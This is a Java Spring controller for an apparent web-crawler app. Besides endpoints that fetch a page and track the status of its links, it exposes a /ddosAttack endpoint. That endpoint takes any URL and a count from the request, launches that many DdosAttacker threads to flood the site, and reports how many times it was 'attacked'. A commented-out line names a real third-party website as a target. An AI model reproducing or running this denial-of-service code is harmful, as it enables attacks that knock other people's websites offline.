package org.cky.spider.controller;

import java.io.IOException;
import java.util.List;
import org.attack.ddos.DdosAttacker;

import org.cky.spider.model.DocumentDetails;
import org.cky.spider.model.HyperMediaLink;
import org.cky.spider.repository.HyperMediaLinkRepository;
import org.cky.spider.service.CrawlerService;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class CrawlerController {

    CrawlerService crawlerService;
    HyperMediaLinkRepository hyperMediaLinkRepository;

    public CrawlerController(CrawlerService crawlerService, HyperMediaLinkRepository hyperMediaLinkRepository) {
        super();
        this.crawlerService = crawlerService;
        this.hyperMediaLinkRepository = hyperMediaLinkRepository;

    }

    @PostMapping("/search")
    public String fecthDetails(Model model, @RequestParam("pageURI") String pageURI) throws IOException {
        System.out.println(" pageURI = " + pageURI);

        DocumentDetails documentDetails = null;

        documentDetails = crawlerService.fectchPageDetails(pageURI);
        model.addAttribute("documentDetails", documentDetails);
        model.addAttribute("hyperMediaLinks", documentDetails.getHyperMediaLinks());
        model.addAttribute("pageURI", pageURI);

        crawlerService.processHyperLinkStatus(documentDetails.getHyperMediaLinks());

        return "result";
    }

    @RequestMapping(value = "/ddosAttack", params = {"url", "times"}, method = RequestMethod.GET)
    public String findPaginated(Model model,@RequestParam("url") String url,@RequestParam("times") int times) {
        System.out.println(" url = " + url);
        model.addAttribute("finalString", "");
        DdosAttacker.totalVisited = 0;
        for (int i = 0; i < times; i++) {
            DdosAttacker.url= url;//"http://www.w3schools.com";
            DdosAttacker.singleUserVisitingTime = 10;
            DdosAttacker object = new DdosAttacker();
            object.start();
        }
        model.addAttribute("finalString", "Attacked URL is "+url+" Visited: "+times*10+" Times.");
        return "ddosResult";
    }

    @ResponseBody
    @GetMapping("/checkIfCompleted")
    public Boolean checkIfCompleted(@RequestParam Long docId, @RequestParam Integer counter) {

        List<HyperMediaLink> list = hyperMediaLinkRepository.findByDocIdAndStatus(docId, -1);

        if (counter == 20) {
            list.forEach(hml -> {
                hml.setStatus(504);
                hml.setErrorMessage("Timeout error");
            });

            // set timeout status to stop loading in UI 
            hyperMediaLinkRepository.saveAll(list);
            System.out.println("forcefully stopped.");
            return true;
        } else if (list == null || list.size() == 0) {
            System.out.println("List empty .");
            return true;
        }

        return false;
    }

    @GetMapping("/refreshLinks")
    public String refreshLinks(Model model, @RequestParam Long docId) {
        System.out.println("docId= " + docId);

        List<HyperMediaLink> list = hyperMediaLinkRepository.findByDocId(docId);

        model.addAttribute("hyperMediaLinks", list);

        return "linkDetails";

    }
}
